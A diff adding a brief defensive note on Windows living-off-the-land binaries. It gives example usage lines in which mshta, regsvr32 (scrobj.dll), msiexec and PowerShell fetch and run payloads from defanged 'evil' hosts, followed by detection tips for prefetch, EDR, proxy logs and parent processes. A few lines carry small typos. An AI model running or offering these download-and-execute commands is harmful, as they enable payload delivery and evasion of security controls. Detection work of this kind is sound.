@@ -1,0 +1,28 @@
+Living Off the Land techniques for exploitation are popular among both sophisticated and unsophisticated adversaries. 
+Adversaries predominantly may use below windows utilities to download any executables and bypass security devices or proxy  or
+application whitelisting etc.
+Their use reduces the likelihood of detection and may increase the required investigation time.
+
+Windows Utilities:
+certutil
+Regsvr32
+MSHTA
+Powershell
+curl
+
+Usage :
+mshta.exe https[:]//evil/evil[.]hta
+mshta evil[.]hta
+regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll
+MSIEXEC /j m evil[.]msi
+msiexec /q /i http[:]//evil/evil[.]msi 
+Powershell:Invoke-WebRequest -Uri $url -OutFile $outpu
+Powershell:(New-Object System.Net.WebClient).DownloadFile($url, $output
+Powershell:Start-BitsTransfer -Source $url -Destination $output -Asynchronous
+
+
+Detection:
+1.Look for these utilities prefetch files and Parsing the prefetch will provide the executed file. 
+2.Command execution and arguments passed to these utilities using EDR solutions.
+3.Look for the HTTP useragents with regsvr32/mshta/certuril in the network recorders or the proxy logs.
+4.Look for suspicious process in the system with parent process as these utilities.
